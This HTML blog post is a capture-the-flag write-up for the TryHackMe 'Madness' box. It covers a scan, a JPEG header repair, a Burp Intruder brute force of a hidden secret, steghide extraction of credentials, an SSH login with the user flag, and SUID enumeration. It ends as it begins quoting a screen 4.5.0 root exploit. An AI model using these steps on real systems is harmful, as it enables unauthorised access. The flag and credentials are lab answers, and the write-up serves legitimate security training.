@@ -1,0 +1,547 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>THM Writeup - Madness (Easy) :: CyberSpider</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Madness is a easy difficulty linux box." />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="/posts/madness/" />
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  <link rel="stylesheet" href="/styles.css">
+
+
+
+<link rel="stylesheet" href="/style.css">
+
+
+
+  <link rel="shortcut icon" href="/img/theme-colors/green.png">
+  <link rel="apple-touch-icon" href="/img/theme-colors/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="CyberSpider" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="THM Writeup - Madness (Easy)">
+<meta property="og:description" content="Madness is a easy difficulty linux box." />
+<meta property="og:url" content="/posts/madness/" />
+<meta property="og:site_name" content="CyberSpider" />
+
+  
+    <meta property="og:image" content="/img/favicon/green.png">
+  
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2023-07-03 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container full headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    cyberspider@ubuntu:~$
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/archive">archive</a></li>
+        
+      
+        
+          <li><a href="/search">search</a></li>
+        
+      
+        
+          <li><a href="/whoami">whoami</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/archive" >archive</a></li>
+        
+      
+        
+          <li><a href="/search" >search</a></li>
+        
+      
+        
+          <li><a href="/whoami" >whoami</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="/posts/madness/">THM Writeup - Madness (Easy)</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2023-07-03</time><span class="post-author">CyberSpider</span></div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="/tags/thm/">thm</a>&nbsp;
+      
+      #<a href="/tags/easy/">easy</a>&nbsp;
+      
+      #<a href="/tags/linux/">linux</a>&nbsp;
+      
+    </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <p>The <code>Madness</code> machine is an easy linux box.</p>
+<h2 id="nmap-scan">Nmap Scan<a href="#nmap-scan" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nmap -A -sC -sV 10.10.199.56          
+</span></span><span style="display:flex;"><span>Starting Nmap 7.93 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-12-08 06:26 EST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.199.56
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.071s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">998</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">2048</span> acf9851052656e17f51c34e7d86467b1 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> dd8e5aecb195cddc4d01b3fe5f4e12c1 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> e9ede3eb58773b005e3af524d858348e <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp open  http    Apache httpd 2.4.18 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>|_http-title: Apache2 Ubuntu Default Page: It works
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.18 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 16.37 seconds
+</span></span></code></pre></div><h2 id="analyze-web-applications">Analyze Web Applications<a href="#analyze-web-applications" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>I see view-source:http://madness.thm/
+I find a new directory:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>  &lt;<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;main_page&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>      &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;page_header floating_element&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;[thm.jpg](view-source:http://madness.thm/thm.jpg)&#34;</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;floating_element&#34;</span>/&gt;
+</span></span></code></pre></div><h2 id="steganography-pt-1">Steganography PT 1<a href="#steganography-pt-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>I download this file:  <code>curl -i http://madness.thm/thm.jpg --output thm.jpg</code>
+I analyze the file: strings thm.jpg</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">200</span> <span style="color:#a6e22e">OK</span>
+</span></span><span style="display:flex;"><span>Date<span style="color:#f92672">:</span> <span style="color:#ae81ff">Thu, 08 Dec 2022 11:52:26 GMT</span>
+</span></span><span style="display:flex;"><span>Server<span style="color:#f92672">:</span> <span style="color:#ae81ff">Apache/2.4.18 (Ubuntu)</span>
+</span></span><span style="display:flex;"><span>Last-Modified<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mon, 06 Jan 2020 10:34:26 GMT</span>
+</span></span><span style="display:flex;"><span>ETag<span style="color:#f92672">:</span> <span style="color:#ae81ff">&#34;56c2-59b7634183080&#34;</span>
+</span></span><span style="display:flex;"><span>Accept-Ranges<span style="color:#f92672">:</span> <span style="color:#ae81ff">bytes</span>
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">22210</span>
+</span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">image/jpeg</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$3br</span>
+</span></span><span style="display:flex;"><span>%&amp;&#39;()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz   &lt;-- There is a problem
+</span></span><span style="display:flex;"><span>        #3R
+</span></span><span style="display:flex;"><span>&amp;&#39;()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
+</span></span><span style="display:flex;"><span>#|Ttm
+</span></span></code></pre></div><p>The file contains a errors, in fact, the web page(&ldquo;<a href="http://madness.thm/thm.jpg">http://madness.thm/thm.jpg</a> &ldquo;) anticipated it
+I must fix this errors
+I see the default file signature(jpeg) in this site &ldquo;<a href="https://en.wikipedia.org/wiki/List_of_file_signatures%22">https://en.wikipedia.org/wiki/List_of_file_signatures&quot;</a>:</p>
+<pre tabindex="0"><code> `   FF D8 FF E0 00 10 4A 46   49 46 00 01`      `ÿØÿà␀␐JFIF␀␁`
+</code></pre><p>I use the hexeditor tool to  fix: hexeditor thm.jpg
+After We  see a image, in this image it&rsquo;s written:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>/th1s_1s_h1dd3n
+</span></span></code></pre></div><p>I do a HTTP REQUEST (GET):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ curl http://10.10.202.174/th1s_1s_h1dd3n/ 
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">title</span>&gt;Hidden Directory&lt;/<span style="color:#f92672">title</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">link</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet.css&#34;</span> <span style="color:#a6e22e">rel</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/css&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;main&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">h2</span>&gt;Welcome! I have been expecting you!&lt;/<span style="color:#f92672">h2</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">p</span>&gt;To obtain my identity you need to guess my secret! &lt;/<span style="color:#f92672">p</span>&gt;
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!-- It&#39;s between 0-99 but I don&#39;t think anyone will look here--&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">p</span>&gt;Secret Entered: &lt;/<span style="color:#f92672">p</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">p</span>&gt;That is wrong! Get outta here!&lt;/<span style="color:#f92672">p</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">div</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
+</span></span></code></pre></div><p>Now I capture this request with Burp Suite:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> /th1s_1s_h1dd3n/?secret= <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">10.10.202.174</span>
+</span></span><span style="display:flex;"><span>Cache-Control<span style="color:#f92672">:</span> <span style="color:#ae81ff">max-age=0</span>
+</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36</span>
+</span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span>
+</span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate</span>
+</span></span><span style="display:flex;"><span>Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">en-US,en;q=0.9</span>
+</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
+</span></span></code></pre></div><p>With the Intruder Section, I must create a payload ranging from 1 to 99  each HTTP Request Burp enter in the secret parameter a number(from1 to 99).</p>
+<p>After that I started Attacks, I must check the lenght, I find that in the Request <code>/th1s_1s_h1dd3n/?secret=73</code>  the lenght is <code>636</code>, I controll the Response and Request:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">200</span> <span style="color:#a6e22e">OK</span>
+</span></span><span style="display:flex;"><span>Date<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mon, 12 Dec 2022 16:41:23 GMT</span>
+</span></span><span style="display:flex;"><span>Server<span style="color:#f92672">:</span> <span style="color:#ae81ff">Apache/2.4.18 (Ubuntu)</span>
+</span></span><span style="display:flex;"><span>Vary<span style="color:#f92672">:</span> <span style="color:#ae81ff">Accept-Encoding</span>
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">445</span>
+</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
+</span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html; charset=UTF-8</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">title</span>&gt;Hidden Directory&lt;/<span style="color:#f92672">title</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">link</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet.css&#34;</span> <span style="color:#a6e22e">rel</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/css&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;main&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">h2</span>&gt;Welcome! I have been expecting you!&lt;/<span style="color:#f92672">h2</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">p</span>&gt;To obtain my identity you need to guess my secret! &lt;/<span style="color:#f92672">p</span>&gt;
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!-- It&#39;s between 0-99 but I don&#39;t think anyone will look here--&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">p</span>&gt;Secret Entered: 73&lt;/<span style="color:#f92672">p</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">p</span>&gt;Urgh, you got it right! But I won&#39;t tell you who I am! y2RPJ4QaPF!B&lt;/<span style="color:#f92672">p</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">div</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
+</span></span></code></pre></div><p>I have find the:</p>
+<ul>
+<li>Password: <code>y2RPJ4QaPF!B</code></li>
+</ul>
+<h2 id="steganography-pt-2">Steganography PT 2<a href="#steganography-pt-2" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>I see the info of the thm.jpg file, and I use the discovered password :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ steghide info thm.jpg                             
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;thm.jpg&#34;</span>:
+</span></span><span style="display:flex;"><span>  format: jpeg
+</span></span><span style="display:flex;"><span>  capacity: 1.0 KB
+</span></span><span style="display:flex;"><span>Try to get information about embedded data ? <span style="color:#f92672">(</span>y/n<span style="color:#f92672">)</span> y
+</span></span><span style="display:flex;"><span>Enter passphrase: 
+</span></span><span style="display:flex;"><span>  embedded file <span style="color:#e6db74">&#34;hidden.txt&#34;</span>:
+</span></span><span style="display:flex;"><span>    size: 101.0 Byte
+</span></span><span style="display:flex;"><span>    encrypted: rijndael-128, cbc
+</span></span><span style="display:flex;"><span>    compressed: yes
+</span></span></code></pre></div><p>Ok, I extract the <code>hidden</code> files:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ steghide extract -sf  thm.jpg
+</span></span><span style="display:flex;"><span>Enter passphrase: 
+</span></span><span style="display:flex;"><span>wrote extracted data to <span style="color:#e6db74">&#34;hidden.txt&#34;</span>.
+</span></span></code></pre></div><p>I read the file:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat hidden.txt                           
+</span></span><span style="display:flex;"><span>Fine you found the password! 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Here<span style="color:#e6db74">&#39;s a username 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">wbxre
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">I didn&#39;</span>t say I would make it easy <span style="color:#66d9ef">for</span> you!
+</span></span></code></pre></div><p>I find a username and a password:</p>
+<ul>
+<li>Username: wbxre</li>
+</ul>
+<p>I decrypt  the username with <code>https://gchq.github.io/CyberChef/</code>, I discover that the password is in ROT13 format:</p>
+<ul>
+<li>
+<p>Password : <code>joker</code></p>
+<p>Then I think that the main image, the image that I see  in the main page of the ctf, <code>https://tryhackme.com/room/madness</code>, may be hiding a password</p>
+</li>
+</ul>
+<p>I see info, the password there isn&rsquo;t:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ steghide info cat.jpg        
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;cat.jpg&#34;</span>:
+</span></span><span style="display:flex;"><span>  format: jpeg
+</span></span><span style="display:flex;"><span>  capacity: 6.6 KB
+</span></span><span style="display:flex;"><span>Try to get information about embedded data ? <span style="color:#f92672">(</span>y/n<span style="color:#f92672">)</span> y
+</span></span><span style="display:flex;"><span>Enter passphrase: 
+</span></span><span style="display:flex;"><span>  embedded file <span style="color:#e6db74">&#34;password.txt&#34;</span>:
+</span></span><span style="display:flex;"><span>    size: 83.0 Byte
+</span></span><span style="display:flex;"><span>    encrypted: rijndael-128, cbc
+</span></span><span style="display:flex;"><span>    compressed: yes
+</span></span></code></pre></div><p>I extract password file:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ steghide extract -sf cat.jpg 
+</span></span><span style="display:flex;"><span>Enter passphrase: 
+</span></span><span style="display:flex;"><span>wrote extracted data to <span style="color:#e6db74">&#34;password.txt&#34;</span>.
+</span></span></code></pre></div><p>I read the file:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat password.txt
+</span></span><span style="display:flex;"><span>I didn<span style="color:#e6db74">&#39;t think you&#39;</span>d find me! Congratulations!
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Here take my password
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>*axA&amp;GF8dP
+</span></span></code></pre></div><p>Now I have discover:</p>
+<ul>
+<li>Username: <code>joker</code></li>
+<li>Password: <code>*axA&amp;GF8dP</code></li>
+</ul>
+<p>Login in ssh and discover <code>user.txt</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ssh joker@10.10.202.174
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>joker@10.10.202.174<span style="color:#e6db74">&#39;s password: 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Permission denied, please try again.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">joker@10.10.202.174&#39;</span>s password: 
+</span></span><span style="display:flex;"><span>Welcome to Ubuntu 16.04.6 LTS <span style="color:#f92672">(</span>GNU/Linux 4.4.0-170-generic x86_64<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> * Documentation:  https://help.ubuntu.com
+</span></span><span style="display:flex;"><span> * Management:     https://landscape.canonical.com
+</span></span><span style="display:flex;"><span> * Support:        https://ubuntu.com/advantage
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>The programs included with the Ubuntu system are free software;
+</span></span><span style="display:flex;"><span>the exact distribution terms <span style="color:#66d9ef">for</span> each program are described in the
+</span></span><span style="display:flex;"><span>individual files in /usr/share/doc/*/copyright.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+</span></span><span style="display:flex;"><span>applicable law.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Last login: Sun Jan  <span style="color:#ae81ff">5</span> 18:51:33 <span style="color:#ae81ff">2020</span> from 192.168.244.128
+</span></span><span style="display:flex;"><span>joker@ubuntu:~$ sudo -l
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> joker: 
+</span></span><span style="display:flex;"><span>Sorry, user joker may not run sudo on ubuntu.
+</span></span><span style="display:flex;"><span>joker@ubuntu:~$ ls
+</span></span><span style="display:flex;"><span>user.txt
+</span></span><span style="display:flex;"><span>joker@ubuntu:~$ cat user.txt
+</span></span><span style="display:flex;"><span>THM<span style="color:#f92672">{</span>d5781e53b130efe2f94f9b0354a5e4ea<span style="color:#f92672">}</span>   &lt;-- Flag user.txt
+</span></span><span style="display:flex;"><span>joker@ubuntu:~$ 
+</span></span></code></pre></div><h2 id="vertical-privilege-escalation">Vertical Privilege Escalation<a href="#vertical-privilege-escalation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>I see binary file that it has <code>sudo permissions</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>joker@ubuntu:~$  find / -perm -4000 2&gt;/dev/null | grep <span style="color:#e6db74">&#34;/bin/&#34;</span>
+</span></span><span style="display:flex;"><span>/usr/bin/vmware-user-suid-wrapper
+</span></span><span style="display:flex;"><span>/usr/bin/gpasswd
+</span></span><span style="display:flex;"><span>/usr/bin/passwd
+</span></span><span style="display:flex;"><span>/usr/bin/newgrp
+</span></span><span style="display:flex;"><span>/usr/bin/chsh
+</span></span><span style="display:flex;"><span>/usr/bin/chfn
+</span></span><span style="display:flex;"><span>/usr/bin/sudo
+</span></span><span style="display:flex;"><span>/bin/fusermount
+</span></span><span style="display:flex;"><span>/bin/su
+</span></span><span style="display:flex;"><span>/bin/ping6
+</span></span><span style="display:flex;"><span>/bin/screen-4.5.0
+</span></span><span style="display:flex;"><span>/bin/screen-4.5.0.old
+</span></span><span style="display:flex;"><span>/bin/mount
+</span></span><span style="display:flex;"><span>/bin/ping
+</span></span><span style="display:flex;"><span>/bin/umount
+</span></span><span style="display:flex;"><span>joker@ubuntu:~$
+</span></span></code></pre></div><p>I see the <code>/bin/screen-4.5.0</code> file , I search the exploit for this file
+I find this <a href="https://www.exploit-db.com/exploits/41154">exploit</a>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e"># screenroot.sh</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># setuid screen v4.5.0 local root exploit</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># abuses ld.so.preload overwriting to get root.</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># HACK THE PLANET</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ~ infodox (25/1/2017) </span>
